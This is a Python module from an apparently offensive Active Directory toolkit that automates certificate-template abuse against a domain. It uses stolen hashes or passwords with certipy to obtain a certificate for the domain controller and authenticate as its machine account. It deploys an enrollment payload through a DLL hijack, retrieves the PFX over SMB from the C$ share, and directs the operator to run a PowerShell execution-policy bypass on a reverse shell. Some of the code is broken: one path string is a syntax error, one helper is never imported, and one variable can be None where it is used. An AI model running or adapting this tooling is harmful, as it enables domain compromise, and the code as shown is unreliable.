from __future__ import annotations

import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import TYPE_CHECKING

from admapper.adcs.analyze import get_adcs_finding
from admapper.core.platform import resolve_certipy
from admapper.adcs.enroll import build_local_enroll_powershell
from admapper.core.output import print_info, print_success, print_warning
from admapper.creds.common import pick_dc_ip
from admapper.models.credential import Credential, CredentialType
from admapper.postex.pe_arch import TargetArch

if TYPE_CHECKING:
    from admapper.core.session import Session


@dataclass
class CertEnrollResult:
    finding_id: str
    template: str
    ca_name: str
    principal: str
    pfx_path: str | None = None
    auth_output: str = ""
    success: bool = False
    error: str | None = None


def _pick_pivot_cred(session: Session, username: str) -> Credential | None:
    store = session.credentials
    if store is None:
        return None
    for cred in store.list():
        if cred.username.lower() != username.lower():
            continue
        if cred.secret:
            return cred
    return None


def run_certipy_enrollment(
    session: Session,
    *,
    finding_id: str = "adcs-002",
    dns_name: str | None = None,
    cred_id: str | None = None,
) -> CertEnrollResult:
    """Run certipy req + auth for pivot user (requires hash/password in cred store)."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    finding = get_adcs_finding(session, finding_id)
    if finding is None:
        raise ValueError(f"AD CS finding not found: {finding_id} — run adcs first")

    template = str(finding.get("template") or "")
    if not template:
        raise ValueError("no template specified on AD CS finding")
    ca_name = str(finding.get("ca_name") or "")
    if not ca_name:
        raise ValueError("no CA name specified on AD CS finding")
    principal = str(finding.get("principal") or session.workspace.pivot_user or "")
    if not principal:
        raise ValueError("no principal on finding — set escalate pivot")

    domain = session.workspace.domain
    if not domain:
        raise ValueError("no workspace domain — run scan/recon first")
    dc_ip = pick_dc_ip(session)
    if not dc_ip:
        raise ValueError("no DC IP")

    from admapper.creds.common import resolve_dc_fqdn

    ws_path = session.workspaces.path_for(session.workspace.name)
    dns = dns_name or resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain}"
    out_dir = ws_path / "certs"
    out_dir.mkdir(parents=True, exist_ok=True)

    certipy = resolve_certipy()
    if not certipy:
        raise RuntimeError("certipy not on PATH — pip install certipy-ad")

    cred = None
    if cred_id and session.credentials:
        cred = next((c for c in session.credentials.list() if c.id == cred_id), None)
    if cred is None:
        cred = _pick_pivot_cred(session, principal)

    if cred is None:
        ps = build_local_enroll_powershell(template=template, dns_name=dns, ca_host=dns, ca_name=ca_name)
        script_path = out_dir / f"enroll_{principal.replace('.', '_')}.ps1"
        script_path.write_text(ps + "\n", encoding="utf-8")
        print_warning(f"no credential for {principal} — use local enrollment on reverse shell")
        print_info(f"script saved → {script_path}")
        print_info("on reverse shell: powershell -ep bypass -File <paste script>")
        return CertEnrollResult(
            finding_id=finding_id,
            template=template,
            ca_name=ca_name,
            principal=principal,
            error="no pivot credential — use local enroll script",
        )

    user = f"{principal}@{domain}"
    if cred.type == CredentialType.NTLM:
        auth_args = ["-hashes", f":{cred.secret}"]
    else:
        auth_args = ["-p", cred.secret]

    req_cmd = [
        certipy,
        "req",
        "-u",
        user,
        *auth_args,
        "-dc-ip",
        dc_ip,
        "-ca",
        ca_name,
        "-template",
        template,
        "-dns",
        dns,
        "-target",
        dc_ip,
    ]
    print_info(f"certipy req as {principal} → {template} ({dns})")
    proc = subprocess.run(req_cmd, capture_output=True, text=True, timeout=120, cwd=str(out_dir))
    output = (proc.stdout or "") + (proc.stderr or "")
    if proc.returncode != 0:
        print_warning(output[:800])
        return CertEnrollResult(
            finding_id=finding_id,
            template=template,
            ca_name=ca_name,
            principal=principal,
            error=f"certipy req failed (exit {proc.returncode})",
        )

    pfx_files = sorted(out_dir.glob("*.pfx"), key=lambda p: p.stat().st_mtime, reverse=True)
    if not pfx_files:
        print_warning(output[:600])
        return CertEnrollResult(
            finding_id=finding_id,
            template=template,
            ca_name=ca_name,
            principal=principal,
            error="certipy req succeeded but no .pfx in workspace/certs",
        )

    pfx = pfx_files[0]
    print_success(f"issued → {pfx}")

    wsus_only = bool(finding.get("wsus_chain_step"))
    cert_auth_ok = bool(finding.get("cert_auth_viable", True)) and not wsus_only
    if not cert_auth_ok:
        print_info("template has Server Authentication only — skip certipy auth; use WSUS chain")
        return CertEnrollResult(
            finding_id=finding_id,
            template=template,
            ca_name=ca_name,
            principal=principal,
            pfx_path=str(pfx),
            success=True,
        )

    host_user = dns.split(".")[0] + "$"
    auth_cmd = [
        certipy,
        "auth",
        "-pfx",
        str(pfx.name),
        "-username",
        host_user,
        "-domain",
        domain,
        "-dc-ip",
        dc_ip,
    ]
    print_info(f"certipy auth as {domain}\\{host_user}")
    auth_proc = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=120, cwd=str(out_dir))
    auth_out = (auth_proc.stdout or "") + (auth_proc.stderr or "")
    if auth_proc.returncode == 0:
        print_success("certificate authentication OK")
        print_info(auth_out[:600])
    else:
        print_warning(auth_out[:600])

    return CertEnrollResult(
        finding_id=finding_id,
        template=template,
        ca_name=ca_name,
        principal=principal,
        pfx_path=str(pfx),
        auth_output=auth_out,
        success=auth_proc.returncode == 0,
    )


def fetch_pfx_via_smb(
    session: Session,
    *,
    remote_name: str | None = None,
    drop_path: str | None = None,
    cred_id: str | None = None,
    retries: int = 5,
    retry_delay: int = 15,
) -> Path | None:
    """Download issued PFX from a task drop path via SMB."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    from admapper.postex.creds import resolve_winrm_cred

    dc_ip = pick_dc_ip(session)
    if not dc_ip:
        raise ValueError("no DC IP")

    domain = session.workspace.domain
    if not domain:
        raise ValueError("no workspace domain")

    cred = resolve_winrm_cred(session, cred_id=cred_id, host=dc_ip)
    if not cred.uses_nthash and not cred.password:
        raise ValueError("need machine/hash or password for SMB")

    try:
        from impacket.smbconnection import SMBConnection
    except ImportError as exc:
        raise RuntimeError("impacket required for SMB fetch") from exc

    ws_path = session.workspaces.path_for(session.workspace.name)
    out_dir = ws_path / "certs"
    out_dir.mkdir(parents=True, exist_ok=True)

    if not remote_name:
        dns = resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain}"
        remote_name = f"{dns}.pfx"
    local = out_dir / remote_name
    drop = (drop_path or r"C:\ProgramData").lstrip(r"C:\").replace("\\", "/")
    remote = f"{drop}/{remote_name}"

    secret = cred.nthash if cred.uses_nthash else cred.password
    last_exc: Exception | None = None
    for attempt in range(max(retries, 1)):
        try:
            smb = SMBConnection(dc_ip, dc_ip, sess_port=445, timeout=45)
            smb.login(cred.username, secret, domain)
            with open(local, "wb") as handle:
                smb.getFile("C$", remote, handle.write)
            print_success(f"downloaded PFX → {local}")
            return local
        except Exception as exc:
            last_exc = exc
            if attempt + 1 < retries:
                print_info(f"SMB fetch retry {attempt + 2}/{retries} in {retry_delay}s …")
                import time

                time.sleep(retry_delay)
    if last_exc:
        raise last_exc
    return None


def _wait_for_remote_pfx(
    session: Session,
    *,
    remote_name: str,
    drop_path: str = r"C:\ProgramData",
    timeout: int = 240,
) -> bool:
    from admapper.adcs.enroll import parse_enroll_log
    from admapper.postex.creds import resolve_winrm_cred
    from admapper.postex.runner import _winrm_client_from_cred

    dc_ip = pick_dc_ip(session)
    if not dc_ip:
        return False
    cred = resolve_winrm_cred(session, host=dc_ip)
    client = _winrm_client_from_cred(cred)
    log_path = f"{drop_path.rstrip('\\/')}\\enroll.log"
    safe_log = log_path.replace("'", "''")
    remote = f"{drop_path.rstrip('\\/')}\\{remote_name}"
    safe = remote.replace("'", "''")
    log_safe = log_path.replace("'", "''")
    import time

    deadline = time.time() + timeout
    while time.time() < deadline:
        proc = client.execute(
            f"Test-Path -LiteralPath '{safe}'",
            shell="powershell",
        )
        if "True" in (proc.stdout or ""):
            print_success(f"PFX present on target: {remote}")
            return True
        log_proc = client.execute(
            f"if(Test-Path -LiteralPath '{log_safe}'){{Get-Content -LiteralPath '{log_safe}' -Tail 30}}",
            shell="powershell",
        )
        status = parse_enroll_log(log_proc.stdout or "")
        if status.present and status.errors and not status.success:
            print_warning(f"enroll.log error: {status.errors[0]}")
            return False
        time.sleep(20)
    return False


def run_enroll_hijack(
    session: Session,
    *,
    finding_id: str = "adcs-002",
    dns_name: str | None = None,
    op_id: str | None = None,
    wait_seconds: int = 300,
    arch: TargetArch | None = None,
    run_certipy_auth: bool | None = None,
    drop_path: str = r"C:\ProgramData",
) -> CertEnrollResult:
    """Deploy enroll DLL + enroll.ps1, poll task, SMB-fetch PFX; optional certipy auth if EKU allows."""
    from admapper.postex.runner import run_dll_hijack

    finding = get_adcs_finding(session, finding_id)
    template = str((finding or {}).get("template") or "")
    ca_name = str((finding or {}).get("ca_name") or "")
    principal = str((finding or {}).get("principal") or session.workspace.pivot_user or "")  # type: ignore[union-attr]
    wsus_only = bool((finding or {}).get("wsus_chain_step"))
    if run_certipy_auth is None:
        run_certipy_auth = not wsus_only and bool((finding or {}).get("cert_auth_viable", True))

    if not (template and ca_name):
        error = "ADCS finding missing template or ca_name"
        print_warning(error)
        return CertEnrollResult(
            finding_id=finding_id,
            template=template,
            ca_name=ca_name,
            principal=principal,
            error=error,
        )

    ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
    dc_ip = pick_dc_ip(session) or ""
    domain = session.workspace.domain
    if not domain:
        raise ValueError("no workspace domain")
    resolved_dns = dns_name or resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain}"

    run_dll_hijack(
        session,
        op_id=op_id,
        wait_seconds=wait_seconds,
        no_listener=True,
        payload_mode="enroll",
        enroll_template=template,
        enroll_dns=resolved_dns,
        enroll_ca_name=ca_name,
        arch=arch or "x86",
    )

    remote_pfx = f"{resolved_dns}.pfx"
    if not _wait_for_remote_pfx(
        session, remote_name=remote_pfx, drop_path=drop_path, timeout=min(wait_seconds, 240)
    ):
        print_warning(f"PFX not observed on target — check {drop_path}\\enroll.log")

    try:
        pfx = fetch_pfx_via_smb(session, remote_name=remote_pfx, drop_path=drop_path)
    except Exception as exc:
        print_warning(f"SMB PFX fetch: {exc}")
        return CertEnrollResult(
            finding_id=finding_id,
            template=template,
            ca_name=ca_name,
            principal=principal,
            error=str(exc),
        )

    if not pfx:
        return CertEnrollResult(
            finding_id=finding_id,
            template=template,
            ca_name=ca_name,
            principal=principal,
            error="no pfx downloaded",
        )

    if not run_certipy_auth:
        print_success(f"issued PFX saved → {pfx}")
        print_info("enrollment-only template — next: use the certificate for its intended EKU")
        return CertEnrollResult(
            finding_id=finding_id,
            template=template,
            ca_name=ca_name,
            principal=principal,
            pfx_path=str(pfx),
            success=True,
        )

    domain = session.workspace.domain
    if not domain:
        raise ValueError("no workspace domain")
    dc_ip = pick_dc_ip(session) or ""
    certipy = resolve_certipy()
    if not certipy or not pfx:
        return CertEnrollResult(
            finding_id=finding_id,
            template=template,
            ca_name=ca_name,
            principal=principal,
            pfx_path=str(pfx) if pfx else None,
            error="certipy missing or no pfx",
        )

    host_user = dns_name.split(".")[0] + "$"
    auth_cmd = [
        certipy,
        "auth",
        "-pfx",
        str(pfx.name),
        "-username",
        host_user,
        "-domain",
        domain,
        "-dc-ip",
        dc_ip,
    ]
    print_info(f"certipy auth as {domain}\\{host_user}")
    auth_proc = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=120, cwd=str(pfx.parent))
    auth_out = (auth_proc.stdout or "") + (auth_proc.stderr or "")
    if auth_proc.returncode == 0:
        print_success("certificate authentication OK")
        print_info(auth_out[:800])
    else:
        print_warning(auth_out[:600])

    return CertEnrollResult(
        finding_id=finding_id,
        template=template,
        ca_name=ca_name,
        principal=principal,
        pfx_path=str(pfx),
        auth_output=auth_out,
        success=auth_proc.returncode == 0,
    )
